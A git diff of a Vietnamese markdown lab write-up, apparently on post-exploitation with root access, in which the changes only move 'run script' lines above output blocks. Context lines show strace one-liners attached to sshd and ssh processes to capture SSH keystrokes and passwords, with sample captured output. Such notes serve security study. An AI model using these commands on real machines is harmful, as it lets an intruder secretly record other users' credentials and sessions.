@@ -58,8 +58,10 @@ Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy t�
      sudo strace -t -e read,write,openat -f -p $sshd_pid 2>&1 | grep --line-buffered -F -e 'write(5, "\0\0\0\' -e 'read(6, "\f\0\0\' -e '.profile'  
      ```
 
-   - Output:
+   - Chạy script: `source sshd_logger.sh`
 
+   - Output:
+   
      ```bash
      linhtd99@ubuntu:~/Desktop/C3$ source sshd_logger.sh
      
@@ -79,9 +81,7 @@ Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy t�
      [pid  6470] 21:46:38 write(5, "\0\0\0\1\34", 5) = 5
      [pid  6471] 21:46:38 openat(AT_FDCWD, "/home/test/.profile", O_RDONLY) = 3
      ```
-     
-   - Chạy script: `source sshd_logger.sh`
-
+  
    - Mô tả ý tưởng:
 
      - Đầu tiên cần phải lấy được **PID** của `sshd`
@@ -112,8 +112,10 @@ Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy t�
      sudo strace -t -p $ssh_pid -e read,openat  2>&1 | grep --line-buffered -w -e 'openat' -e '= 1'
      ```
 
-   - Output: 
+   - Chạy script: `source ssh_logger.sh`
 
+   - Output: 
+   
      ```bash
      linhtd99@ubuntu:~/Desktop/C3$ source ssh_logger.sh
      
@@ -154,8 +156,6 @@ Mô tả: Trường hợp đang có quyền root để truy cập vào 1 máy t�
      21:44:32 read(4, "\n", 1)               = 1
      21:44:32 openat(AT_FDCWD, "/dev/null", O_WRONLY) = 7
      ```
-
-   - Chạy script: `source ssh_logger.sh`
 
    - Mô tả ý tưởng
 
